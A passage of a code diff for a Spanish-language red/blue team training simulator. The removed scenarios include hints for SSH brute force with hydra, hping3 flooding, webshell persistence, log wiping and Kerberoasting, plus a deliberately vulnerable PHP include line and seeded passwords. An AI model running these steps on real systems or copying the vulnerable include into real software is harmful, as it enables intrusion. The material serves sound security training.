-                    ip: '10.0.10.5',
-                    hostname: 'BOVEDA-WEB',
-                    os: 'linux',
-                    services: {
-                        22: { name: 'ssh', version: 'OpenSSH 7.4', state: 'open', vulnerabilities: [] },
-                        80: { name: 'http', version: 'Apache 2.4.6', state: 'open', vulnerabilities: [] },
-                        443: { name: 'https', version: 'Apache 2.4.6', state: 'open', vulnerabilities: [] },
-                        3306: { name: 'mysql', version: 'MySQL 5.5.62', state: 'open', vulnerabilities: [] },
-                    },
-                    users: [
-                        { username: 'root', password: 'toor', privileges: 'root' },
-                        { username: 'admin', password: 'complex_password_!@#$', privileges: 'admin' },
-                        { username: 'blue-team', password: 'Bl#3T3@m!2024', privileges: 'admin' },
-                    ],
-                    files: [
-                        { path: '/var/log/auth.log', permissions: '640', content: '# Authentication log file\n', hash: 'auth_log_initial' },
-                        { path: '/var/www/html/index.php', permissions: '644', content: '<?php echo "<h1>BOVEDA-WEB v1.0</h1>"; ?>', hash: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4' },
-                        { path: '/var/www/html/backup/db_config.php.bak', permissions: '644', content: '<?php\n$db_host = "localhost";\n$db_user = "root";\n$db_pass = "mysql_root_pass";\n$db_name = "production_db";\n?>', hash: 'backup_config_hash' },
-                        { path: '/var/www/html/db_config.php', permissions: '644', content: '<?php\n$db_host = "localhost";\n$db_user = "root";\n$db_pass = "mysql_root_pass";\n$db_name = "production_db";\n?>', hash: 'db_config_hash' },
-                        { path: '/etc/ssh/sshd_config', permissions: '600', content: '... PermitRootLogin yes ...', hash: 'sshd_config_hash_7' },
-                    ],
-                    systemState: { cpuLoad: 5.0, memoryUsage: 25.0, networkConnections: 15, failedLogins: 0 }
-                }],
-                firewall: { enabled: false, rules: [] },
-                ids: { enabled: true, signatures: ['SSH_BRUTEFORCE'], alerts: [] }
-            }
-        },
-        attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
-        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
-        timeline: []
+export const RESOURCE_MODULES: ResourceModule[] = [
+    {
+        id: 'module-1',
+        icon: 'shield',
+        title: 'Fundamentos del SOC',
+        content: <div>
+            <p className="text-slate-300 mb-4">El Centro de Operaciones de Seguridad (SOC) es el corazón de la defensa cibernética moderna.</p>
+            <h5 className="text-cyan-400 font-bold mb-2">Funciones Principales:</h5>
+            <ul className="list-disc pl-5 text-slate-400 space-y-2">
+                <li><strong className="text-white">Monitoreo:</strong> Vigilancia 24/7 de la infraestructura.</li>
+                <li><strong className="text-white">Detección:</strong> Identificación de actividades sospechosas.</li>
+                <li><strong className="text-white">Respuesta:</strong> Contención y erradicación de amenazas.</li>
+            </ul>
+        </div>
     },
-    objectives: [
-        // === EQUIPO AZUL ===
-        { id: 'blue-firewall-check', description: 'Diagnóstico: Verificar estado del firewall UFW', points: 5, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('ufw status'))},
-        { id: 'blue-firewall-activate', description: 'Activar UFW con reglas SSH, HTTP, HTTPS (Bloquear 3306)', points: 20, required: true, validator: (env) => {
-            const fw = env.networks.dmz.firewall;
-            const allowedPorts = fw.rules.filter(r => r.action === 'allow').map(r => r.destPort);
-            const sshAllowed = allowedPorts.includes(22);
-            const mysqlAllowed = allowedPorts.includes(3306);
-            return fw.enabled && sshAllowed && !mysqlAllowed;
-        }, hint: '¡CRÍTICO! Permite SSH (22) PRIMERO o te quedarás bloqueado. Luego HTTP (80) y HTTPS (443).'},
-        { id: 'blue-ssh-hardening', description: 'Endurecer SSH: Deshabilitar login directo de root', points: 15, required: true, validator: (env) => !!env.networks.dmz.hosts[0].files.find(f => f.path === '/etc/ssh/sshd_config')?.content?.includes('PermitRootLogin no'), hint: 'Edita /etc/ssh/sshd_config y cambia PermitRootLogin a "no". Reinicia sshd.'},
-        { id: 'blue-file-permissions-check', description: 'Identificar archivos con permisos inseguros (644)', points: 5, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('ls -l'))},
-        { id: 'blue-file-permissions-fix', description: 'Asegurar permisos de db_config.php (640)', points: 15, required: true, validator: (env) => {
-            const file = env.networks.dmz.hosts[0].files.find(f => f.path === '/var/www/html/db_config.php');
-            return file ? parseInt(file.permissions) <= 640 : false;
-        }, hint: 'Usa chmod 640 para quitar permisos de lectura a "otros".'},
-        { id: 'blue-monitoring-setup', description: 'Monitoreo activo: Analizar logs de autenticación', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('tail') || log.message.includes('grep')) && log.message.includes('auth.log'))},
-
-        // === EQUIPO ROJO ===
-        { id: 'red-reconnaissance-nmap', description: 'Reconocimiento: Escanear puertos y servicios (Nmap)', points: 10, required: true, validator: (env) => env.attackProgress.reconnaissance.includes('10.0.10.5')},
-        { id: 'red-web-enumeration', description: 'Enumeración Web: Descubrir directorios ocultos (dirb)', points: 5, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('dirb'))},
-        { id: 'red-backup-exfiltration', description: 'Exfiltración: Obtener credenciales de backup expuesto', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('curl') && log.message.includes('backup'))},
-        { id: 'red-bruteforce-ssh', description: 'Acceso Inicial: Fuerza bruta contra SSH (Hydra)', points: 25, required: true, validator: (env) => !!env.attackProgress.credentials['root@10.0.10.5'], hint: 'Usa hydra contra el usuario root. La contraseña es débil.'},
-        { id: 'red-ssh-access', description: 'Compromiso: Acceder al servidor via SSH', points: 20, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.10.5')},
-        { id: 'red-file-exfiltration', description: 'Post-Explotación: Leer archivo de configuración de BD', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('cat') && log.message.includes('db_config.php')) && env.attackProgress.compromised.includes('10.0.10.5')},
-        { id: 'red-backdoor-webshell', description: 'Persistencia: Instalar Webshell en index.php', points: 35, required: true, validator: (env) => {
-             const index = env.networks.dmz.hosts[0].files.find(f => f.path === '/var/www/html/index.php');
-             return index?.hash !== '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4';
-        }, hint: 'Modifica index.php para inyectar código PHP malicioso.'},
-        { id: 'red-persistence-user', description: '(Bonus) Crear usuario backdoor', points: 10, required: false, validator: (env) => env.networks.dmz.hosts[0].users.some(u => u.username === 'backdoor')},
-        { id: 'red-persistence-cron', description: '(Bonus) Persistencia via Cron', points: 5, required: false, validator: (env) => env.attackProgress.persistence.includes('cron_job_set')},
-    ],
-    hints: [
-        { trigger: (env) => !env.networks.dmz.firewall.enabled && env.timeline.length > 10, message: '🚨 [EQUIPO AZUL] ALERTA CRÍTICA: El firewall sigue desactivado. Todos los puertos están expuestos.' },
-        { trigger: (env) => env.attackProgress.reconnaissance.includes('10.0.10.5') && !env.networks.dmz.firewall.enabled, message: '⚠️ [EQUIPO AZUL] Escaneo detectado. Activa el firewall AHORA.' },
-        { trigger: (env) => (env.networks.dmz.hosts[0].systemState?.failedLogins ?? 0) > 10, message: '🚨 [EQUIPO AZUL] Ataque de fuerza bruta masivo en SSH. Revisa /var/log/auth.log.' },
-        { trigger: (env) => !!env.attackProgress.credentials['root@10.0.10.5'] && !env.attackProgress.compromised.includes('10.0.10.5'), message: '💡 [EQUIPO ROJO] Tienes las credenciales. Conéctate ahora: ssh root@BOVEDA-WEB' },
-    ],
-    evaluation: (env) => ({ completed: false, score: 0, feedback: [] })
-};
-
-const calculateResponseTime = (env: VirtualEnvironment): string => {
-    const attackLog = env.timeline.find(log => log.message.includes('hydra') || log.message.includes('hping3'));
-    const defenseLog = env.timeline.find(log => log.message.includes('ufw deny from') || log.message.includes('fail2ban-client'));
-
-    if (attackLog && defenseLog) {
-        const attackTime = new Date(attackLog.timestamp).getTime();
-        const defenseTime = new Date(defenseLog.timestamp).getTime();
-        const diffSeconds = (defenseTime - attackTime) / 1000;
-        return `${Math.max(0, diffSeconds).toFixed(1)}s`;
+    {
+        id: 'module-2',
+        icon: 'terminal',
+        title: 'Comandos Esenciales Linux',
+        content: <div>
+            <p className="text-slate-300 mb-4">Linux es el sistema operativo estándar en ciberseguridad.</p>
+            <div className="grid grid-cols-2 gap-4 text-sm">
+                <div className="bg-black/40 p-2 rounded border border-slate-800">
+                    <code className="text-yellow-400 block">ls -la</code>
+                    <span className="text-slate-500">Listar archivos (detallado)</span>
+                </div>
+                <div className="bg-black/40 p-2 rounded border border-slate-800">
+                    <code className="text-yellow-400 block">grep "error" log.txt</code>
+                    <span className="text-slate-500">Buscar texto en archivo</span>
+                </div>
+                <div className="bg-black/40 p-2 rounded border border-slate-800">
+                    <code className="text-yellow-400 block">chmod 700 file</code>
+                    <span className="text-slate-500">Cambiar permisos</span>
+                </div>
+                <div className="bg-black/40 p-2 rounded border border-slate-800">
+                    <code className="text-yellow-400 block">ps aux</code>
+                    <span className="text-slate-500">Ver procesos activos</span>
+                </div>
+            </div>
+        </div>
     }
-    return 'N/A';
-};
+];
 
-export const rageScenario: InteractiveScenario = {
-    id: 'escenario8',
-    isInteractive: true,
-    icon: 'bomb',
-    color: 'bg-orange-600',
-    title: 'Furia en la Red: Ataque Combinado',
-    subtitle: 'DoS + Bruteforce Simultáneos',
-    description: 'Alerta crítica: PORTAL-WEB reporta timeout. Tráfico anómalo detectado. Azul debe priorizar y contener. Tiempo estimado: 60 mins.',
-    difficulty: 'advanced',
-    team: 'both',
-    
-    initialEnvironment: {
-        networks: {
-            'dmz': {
-                hosts: [{
-                    ip: '10.0.20.10',
-                    hostname: 'PORTAL-WEB',
-                    os: 'linux',
-                    services: {
-                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
-                        80: { name: 'http', version: 'nginx 1.18', state: 'open', vulnerabilities: [] },
-                        443: { name: 'https', version: 'nginx 1.18', state: 'open', vulnerabilities: [] }
-                    },
-                    users: [
-                        { username: 'admin', password: 'P@ssw0rd', privileges: 'admin' },
-                        { username: 'blue-team', password: 'Bl#3T3@m!2024', privileges: 'admin' }
-                    ],
-                    files: [
-                        { path: '/var/www/html/index.php', permissions: '644', content: '<?php echo "PORTAL-WEB v1.0"; ?>', hash: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4' },
-                        { path: '/var/log/auth.log', permissions: '640', content: '', hash: 'auth_log_initial' }
-                    ],
-                    systemState: {
-                        cpuLoad: 5.0,
-                        memoryUsage: 30.0,
-                        networkConnections: 50,
-                        failedLogins: 0
-                    }
-                }],
-                firewall: {
-                    enabled: true,
-                    rules: [
-                        { id: '1', action: 'allow', protocol: 'tcp', destPort: 22 },
-                        { id: '2', action: 'allow', protocol: 'tcp', destPort: 80 },
-                        { id: '3', action: 'allow', protocol: 'tcp', destPort: 443 }
-                    ]
+const INITIAL_ENV_SCENARIO_7: VirtualEnvironment = {
+    networks: {
+        dmz: {
+            hosts: [{
+                ip: '10.0.10.5',
+                hostname: 'BOVEDA-WEB',
+                os: 'linux',
+                services: {
+                    22: { name: 'ssh', version: 'OpenSSH 7.6', state: 'open', vulnerabilities: [] },
+                    80: { name: 'http', version: 'Apache 2.4', state: 'open', vulnerabilities: [] }
                 },
-                ids: {
-                    enabled: true,
-                    signatures: ['SSH_BRUTEFORCE', 'SYN_FLOOD', 'HTTP_DOS'],
-                    alerts: []
-                }
-            }
-        },
-        attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
-        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
-        timeline: []
-    },
-    
-    objectives: [
-        // === EQUIPO AZUL ===
-        { id: 'blue-dos-detection', description: 'Diagnóstico: Identificar DoS (CPU > 90%)', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('top') || log.message.includes('htop'))), hint: 'Usa "top" o "htop" para diagnosticar la lentitud.'},
-        { id: 'blue-identify-source', description: 'Investigación: Identificar IP del atacante', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('netstat') || log.message.includes('ss '))), hint: 'Usa "ss -ant" o "netstat" para ver conexiones masivas.'},
-        { id: 'blue-bruteforce-detection', description: 'Detección: Descubrir ataque SSH paralelo en logs', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('tail') || log.message.includes('grep') || log.message.includes('journalctl')) && (log.message.includes('auth.log') || log.message.includes('sshd'))), hint: 'El DoS es una distracción. Revisa /var/log/auth.log.'},
-        { id: 'blue-block-attacker', description: 'Contención: Bloquear IP atacante (Detiene DoS y SSH)', points: 25, required: true, validator: (env) => env.defenseProgress.blockedIPs.includes('192.168.1.100'), hint: 'Bloquea la IP 192.168.1.100 usando UFW.'},
-        { id: 'blue-verify-compromise', description: 'Evaluación de Daños: Verificar sesiones activas', points: 15, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('who') || log.message.includes('w '))), hint: 'Usa "who" o "w" para ver si el atacante sigue conectado.'},
-        { id: 'blue-file-integrity', description: 'Integridad: Verificar archivos web (backdoor)', points: 20, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('sha256sum') || log.message.includes('md5sum'))), hint: 'Verifica el hash de index.php.'},
-        { id: 'blue-eradication', description: 'Erradicación: Restaurar sistema y eliminar backdoors', points: 25, required: true, validator: (env) => {
-             const index = env.networks.dmz.hosts[0].files.find(f => f.path === '/var/www/html/index.php');
-             return index?.hash === '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4';
-        }},
-        { id: 'blue-fail2ban', description: '(Bonus) Instalar Fail2Ban', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('systemctl restart fail2ban'))},
-
-        // === EQUIPO ROJO ===
-        { id: 'red-dos-launch', description: 'Distracción: Lanzar DoS (Hping3)', points: 20, required: true, validator: (env) => (env.networks.dmz.hosts[0]?.systemState?.cpuLoad ?? 0) > 90, hint: 'Usa hping3 con flag --flood -S para saturar el servidor.'},
-        { id: 'red-bruteforce-parallel', description: 'Infiltración: Fuerza bruta paralela (mientras DoS activo)', points: 30, required: true, validator: (env) => !!env.attackProgress.credentials['admin@10.0.20.10'], hint: 'Aprovecha el caos. Lanza hydra mientras el DoS corre.'},
-        { id: 'red-ssh-access', description: 'Acceso: Entrar como admin', points: 15, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.20.10'), hint: 'ssh admin@PORTAL-WEB usando la contraseña obtenida.'},
-        { id: 'red-webshell-deploy', description: 'Persistencia: Desplegar Webshell/Backdoor', points: 35, required: true, validator: (env) => env.attackProgress.persistence.includes('webshell') || env.attackProgress.persistence.includes('index_modified'), hint: 'Crea un archivo PHP malicioso o modifica index.php.'},
-        { id: 'red-persistence-advanced', description: '(Bonus) Múltiple persistencia (User/Cron)', points: 15, required: false, validator: (env) => env.attackProgress.persistence.length >= 2},
-        { id: 'red-cover-tracks', description: '(Bonus) Limpiar logs', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('echo') && log.message.includes('auth.log'))},
-    ],
-    
-    hints: [
-        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.cpuLoad ?? 0) > 90, message: '🚨 [EQUIPO AZUL] CPU crítica (99%). Servicio web no responde. ¿Ataque DoS?' },
-        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.failedLogins ?? 0) > 20, message: '🚨 [EQUIPO AZUL] Múltiples fallos de SSH detectados en logs. ¡El DoS es una distracción!' },
-        { trigger: (env) => {
-            const hasCredentials = !!env.attackProgress.credentials['admin@10.0.20.10'];
-            const isBlocked = env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
-            return hasCredentials && !isBlocked;
-          }, message: '⚠️ [EQUIPO AZUL] Credenciales comprometidas y atacante NO bloqueado. Situación crítica.'
-        },
-        { trigger: (env) => !!env.attackProgress.credentials['admin@10.0.20.10'] && !env.attackProgress.compromised.includes('10.0.20.10'), message: '💡 [EQUIPO ROJO] Contraseña obtenida. Entra rápido antes de que te bloqueen.' },
-    ],
-    
-    evaluation: (env) => {
-        const redPoints = rageScenario.objectives.filter(o => o.id.startsWith('red-') && (o as any).validator(env)).reduce((sum, o) => sum + o.points, 0);
-        const bluePoints = rageScenario.objectives.filter(o => o.id.startsWith('blue-') && (o as any).validator(env)).reduce((sum, o) => sum + o.points, 0);
-        
-        const feedback: string[] = [];
-        const isCompromised = env.attackProgress.compromised.includes('10.0.20.10');
-        const isBlocked = env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
-        
-        if (isCompromised && !isBlocked) {
-            feedback.push('⚔️ **VICTORIA DECISIVA DEL EQUIPO ROJO**: Servidor comprometido y persistencia establecida.');
-        } else if (isBlocked && !isCompromised) {
-            feedback.push('🛡️ **VICTORIA DEL EQUIPO AZUL**: Ataque mitigado antes del compromiso.');
-        } else if (isCompromised && isBlocked) {
-            feedback.push('⚖️ **EMPATE TÁCTICO**: Rojo entró, pero Azul lo contuvo eventualmente.');
-        } else {
-            feedback.push('📊 **ESCENARIO EN PROGRESO**');
-        }
-        feedback.push(`\n**Puntuación Final:** Rojo ${redPoints} | Azul ${bluePoints}`);
-        if (isBlocked) {
-            feedback.push(`✓ Tiempo de respuesta (Bloqueo): ${calculateResponseTime(env)}`);
-        }
-        return { completed: redPoints >= 70 || bluePoints >= 60, score: Math.max(redPoints, bluePoints), feedback };
-    }
-};
-
-export const killChainScenario: InteractiveScenario = {
-    id: 'escenario9',
-    isInteractive: true,
-    icon: 'crosshair',
-    color: 'bg-red-800',
-    title: 'La Cadena de Infección (Kill Chain)',
-    subtitle: 'Ataque multi-fase desde la DMZ hasta la red interna.',
-    description: 'El Equipo Rojo debe ejecutar una "Kill Chain" completa, desde la explotación web hasta la exfiltración de datos. El Equipo Azul debe cazar y contener la amenaza en cada fase.',
-    difficulty: 'advanced',
-    team: 'both',
-    initialEnvironment: {
-        networks: {
-            'dmz': {
-                hosts: [{
-                    ip: '10.0.0.10',
-                    hostname: 'WEB-DMZ-01',
-                    os: 'linux',
-                    services: {
-                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
-                        80: { name: 'nginx', version: '1.18', state: 'open', vulnerabilities: [{cve: 'CVE-2013-4547', description: 'LFI Vulnerability', severity: 'high'}] },
-                    },
-                    users: [{ username: 'blue-team', password: 'Blu3T34mDMZ!2024', privileges: 'admin' }],
-                    files: [{ path: '/var/www/html/view.php', permissions: '644', content: '<?php include($_GET["file"]); ?>', hash: 'lfi_vuln_hash' }]
-                }],
-                firewall: { enabled: true, rules: [{id: 'allow-ssh', action: 'allow', protocol: 'tcp', destPort: 22}, {id: 'allow-http', action: 'allow', protocol: 'tcp', destPort: 80}] },
-                ids: { enabled: true, signatures: ['LFI_ATTEMPT', 'REVERSE_SHELL'], alerts: [] }
-            },
-            'internal': {
-                hosts: [{
-                    ip: '10.10.0.50',
-                    hostname: 'DB-FINANCE-01',
-                    os: 'linux',
-                    services: { 
-                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
-                        3306: { name: 'mysql', version: '8.0', state: 'open', vulnerabilities: [] }
-                    },
-                    users: [{ username: 'root', password: 'DbP@ss2024!', privileges: 'root' }],
-                    files: [{ path: '/db/finance_backup.sql', permissions: '600', content: 'CREDIT_CARD_DATA_HERE', hash: 'finance_db_hash' }]
-                }],
-                firewall: { enabled: true, rules: [] },
-                ids: { enabled: false, signatures: [], alerts: [] }
-            }
-        },
-        attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
-        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
-        timeline: []
-    },
-    objectives: [
-        { id: 'red-lfi', description: 'Explotar LFI para leer /etc/passwd en WEB-DMZ-01', points: 15, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('/etc/passwd')) },
-        { id: 'red-rce', description: 'Obtener ejecución remota de código en WEB-DMZ-01', points: 25, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.0.10')},
-        { id: 'red-pivot', description: 'Acceder a DB-FINANCE-01 desde el servidor DMZ', points: 30, required: true, validator: (env) => env.attackProgress.compromised.includes('10.10.0.50')},
-        { id: 'red-exfiltrate', description: 'Exfiltrar el archivo finance_backup.sql', points: 35, required: true, validator: (env) => env.attackProgress.persistence.includes('data_exfiltrated') },
-        
-        { id: 'blue-detect-lfi', description: 'Detectar el intento de LFI en los logs de Nginx', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('grep') && log.message.includes('../../')) },
-        { id: 'blue-contain-dmz', description: 'Contener la amenaza en WEB-DMZ-01 (bloquear IP, matar shell)', points: 25, required: true, validator: (env) => env.defenseProgress.blockedIPs.length > 0 },
-        { id: 'blue-detect-pivot', description: 'Detectar el intento de pivoteo a la red interna', points: 30, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('tcpdump -i eth1')) },
-        { id: 'blue-segment-network', description: 'Bloquear el acceso de la DMZ a la red interna', points: 20, required: true, validator: (env) => env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '10.0.0.10') },
-    ],
-    hints: [
-        { trigger: (env) => env.timeline.some(log => log.message.includes('/etc/passwd')), message: '🚨 [EQUIPO AZUL] Intento de LFI detectado. Investiga los logs de Nginx y el proceso www-data inmediatamente.' },
-        { trigger: (env) => env.attackProgress.compromised.includes('10.0.0.10'), message: '💡 [EQUIPO ROJO] Estás dentro. Enumera las interfaces de red. ¿Hay una red interna a la que puedas pivotar?' },
-    ],
-    evaluation: (env) => ({ completed: false, score: 0, feedback: [] })
-};
-
-export const adEscalationScenario: InteractiveScenario = {
-    id: 'escenario10',
-    isInteractive: true,
-    icon: 'key',
-    color: 'bg-yellow-600',
-    title: 'La Escalada del Dominio (Active Directory)',
-    subtitle: "Ataque de Kerberoasting y Movimiento Lateral en 'cybervaltorix.local'.",
-    description: 'Desde un usuario de bajos privilegios, el Equipo Rojo debe escalar a Administrador de Dominio. El Equipo Azul debe proteger y monitorear Active Directory.',
-    difficulty: 'advanced',
-    team: 'both',
-    initialEnvironment: {
-        networks: {
-            'corp': {
-                hosts: [
-                    {
-                        ip: '10.10.0.5', hostname: 'DC-01', os: 'windows',
-                        services: { 389: { name: 'ldap', version: 'AD', state: 'open', vulnerabilities: [] } },
-                        users: [
-                            { username: 'Administrator', password: 'AdminP@ssw0rd!2024', privileges: 'root'},
-                            { username: 'svc_sql', password: 'SqlP@ssw0rd123', privileges: 'admin' },
-                            { username: 'pasante-red', password: 'Password123', privileges: 'user'},
-                        ],
-                        files: []
-                    },
-                    {
-                        ip: '10.10.0.20', hostname: 'WKSTN-07', os: 'windows',
-                        services: { 3389: { name: 'rdp', version: '10.0', state: 'open', vulnerabilities: [] } },
-                        users: [{ username: 'pasante-red', password: 'Password123', privileges: 'user' }],
-                        files: []
-                    }
+                users: [
+                    { username: 'admin', password: 'P@ssw0rd', privileges: 'user' },
+                    { username: 'root', password: 'toor', privileges: 'root' }
                 ],
-                firewall: { enabled: true, rules: [] },
-                ids: { enabled: true, signatures: ['KERBEROASTING_RC4'], alerts: [] }
-            }
-        },
-        attackProgress: { reconnaissance: [], compromised: ['10.10.0.20'], credentials: {}, persistence: [] },
-        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
-        timeline: []
+                files: [
+                     { path: '/etc/ssh/sshd_config', permissions: '644', hash: 'orig', content: 'PermitRootLogin yes\nPasswordAuthentication yes' },
+                     { path: '/var/www/html/index.php', permissions: '644', hash: 'orig', content: '<h1>Boveda Web</h1>' },
+                     { path: '/var/www/html/db_config.php', permissions: '644', hash: 'orig', content: '<?php $pass="secret"; ?>' }
+                ],
+                systemState: { cpuLoad: 5, memoryUsage: 20, networkConnections: 10, failedLogins: 0 }
+            }],
+            firewall: { enabled: false, rules: [] },
+            ids: { enabled: false, signatures: [], alerts: [] }
+        }
     },
-    objectives: [
-        { id: 'red-kerberoast', description: "Ejecutar un ataque de Kerberoasting y obtener el hash TGS de 'svc_sql'", points: 30, required: true, validator: (env) => env.attackProgress.credentials['svc_sql_hash'] === '$krb5tgs$23$*...' },
-        { id: 'red-crack-hash', description: "Crackear el hash de 'svc_sql' para obtener la contraseña en texto plano", points: 20, required: true, validator: (env) => env.attackProgress.credentials['svc_sql@10.10.0.5'] === 'SqlP@ssw0rd123'},
-        { id: 'red-domain-admin', description: 'Comprometer el Domain Controller (DC-01) y obtener privilegios de Domain Admin', points: 30, required: true, validator: (env) => env.attackProgress.compromised.includes('10.10.0.5') },
-        
-        { id: 'blue-detect-kerberoast', description: 'Detectar el ataque de Kerberoasting monitoreando eventos de seguridad (ID 4769)', points: 20, required: true, validator: (env) => env.defenseProgress.patchedVulnerabilities.includes('kerberoast_detected') },
-        { id: 'blue-secure-account', description: "Asegurar la cuenta 'svc_sql' (deshabilitar, resetear contraseña fuerte)", points: 20, required: true, validator: (env) => env.defenseProgress.hardenedHosts.includes('svc_sql_secured')},
-        { id: 'blue-prevent-lateral', description: 'Prevenir/detectar el movimiento lateral hacia el DC-01', points: 15, required: true, validator: (env) => env.defenseProgress.blockedIPs.includes('10.10.0.20')},
-    ],
-    hints: [
-        { trigger: (env) => env.timeline.filter(log => log.message.includes('kerberoast')).length > 0, message: '🚨 [EQUIPO AZUL] Múltiples solicitudes de tickets de servicio (TGS) para cuentas de servicio detectadas. ¡Posible Kerberoasting en progreso!' },
-        { trigger: (env) => !env.attackProgress.credentials['svc_sql@10.10.0.5'], message: '💡 [EQUIPO ROJO] La cuenta svc_sql tiene un SPN. Es un objetivo ideal para Kerberoasting. Usa Rubeus o GetUserSPNs.py.' },
-    ],
-    evaluation: (env) => ({ completed: false, score: 0, feedback: [] })
+    attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
+    defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
+    timeline: []
 };
-
 
 export const TRAINING_SCENARIOS: (TrainingScenario | InteractiveScenario)[] = [
     {
-        id: 'escenario1', icon: 'layers', color: 'bg-blue-500', title: 'Escenario 1: El Diagnóstico (OSI/TCP-IP)',
-        subtitle: 'Tiempo Estimado: 20 minutos',
-        content: <div className="grid md:grid-cols-2 gap-6">
-            <CisoCard icon="clipboard-list" title="Situación">
-                <p>Reciben dos tickets de soporte simultáneamente:</p>
-                <ul>
-                    <li><strong>Ticket A:</strong> Un usuario (<code>192.168.1.50</code>) se queja de que <code>http://intranet.cybervaltorix.local</code> (<code>10.10.30.5</code>) carga "extremadamente lento".</li>
-                    <li><strong>Ticket B:</strong> Otro usuario (<code>192.168.1.52</code>) reporta que no puede acceder a <code>\\srv-files.cybervaltorix.local</code> (<code>10.10.40.10</code>). Un <code>ping</code> falla con "Destination Host Unreachable".</li>
-                </ul>
-            </CisoCard>
-            <CisoCard icon="target" title="Su Tarea">
-                 <p>Son Nivel 1. Aísles el problema desde su máquina Kali (<code>192.168.1.0/24</code>).</p>
-                 <h4>Entregables</h4>
-                 <ul>
-                     <li><strong>Proceso de Diagnóstico:</strong> Pasos y comandos para ambos tickets.</li>
-                     <li><strong>Aislamiento de Capa:</strong> ¿Qué capa (TCP/IP) es la sospechosa para el Ticket A? ¿Y para el Ticket B?</li>
-                     <li><strong>Herramientas:</strong> ¿Qué comandos (<code>ping</code>, <code>traceroute</code>, etc.) usarían?</li>
-                 </ul>
-            </CisoCard>
-        </div>
-    },
-     {
-        id: 'escenario2', icon: 'shield-alert', color: 'bg-red-500', title: 'Escenario 2: El Vector de Ataque (DNS)',
-        subtitle: 'Tiempo Estimado: 20 minutos',
-        content: <div className="grid md:grid-cols-2 gap-6">
-            <CisoCard icon="clipboard-list" title="Situación">
-                <p>Monitoreando logs de firewall. El Resolver DNS interno es <code>172.16.10.5</code>. Una laptop (<code>172.16.20.100</code>) muestra tráfico anómalo:</p>
-                <pre><code>... 172.16.20.100:34876 -&gt; 8.8.8.8:53 ... ALLOWED
-... 172.16.20.100:34877 -&gt; 1.1.1.1:53 ... ALLOWED
-... 172.16.20.100:41982 -&gt; 198.51.100.50:53 ... ALLOWED</code></pre>
-                <p><code>198.51.100.50</code> es un resolver desconocido en Rusia. El tráfico es constante y las consultas parecen sin sentido (ej. <code>aHR0...com</code>).</p>
-            </CisoCard>
-            <CisoCard icon="target" title="Su Tarea">
-                <ol>
-                    <li>Analizar y explicar el evento.</li>
-                    <li>Proponer contención inmediata (firewall).</li>
-                </ol>
-                <h4>Entregables</h4>
-                <ul>
-                    <li><strong>Análisis de Amenaza:</strong> ¿Riesgo? ¿Por qué es malo usar <code>8.8.8.8</code>? ¿Qué es el tráfico a <code>198.51.100.50</code>?</li>
-                    <li><strong>Política de Contención:</strong> Escriba la política de firewall de egreso (Origen, Destino, Puerto) para neutralizar y prevenir esto.</li>
-                    <li><strong>Simulación (Opcional):</strong> ¿Qué comando de Kali usaría para simular esta consulta anómala?</li>
-                </ul>
-            </CisoCard>
-        </div>
-    },
-    {
-        id: 'escenario3', icon: 'network', color: 'bg-green-500', title: 'Escenario 3: La Segmentación (Subnetting y ACLs)',
-        subtitle: 'Tiempo Estimado: 20 minutos',
-        content: <div className="grid md:grid-cols-2 gap-6">
-            <CisoCard icon="clipboard-list" title="Situación">
-                <p>Implementando política "Zero Trust" en el firewall que segmenta las subredes VLSM.</p>
-                <h5>Las Zonas de Red:</h5>
-                <ul>
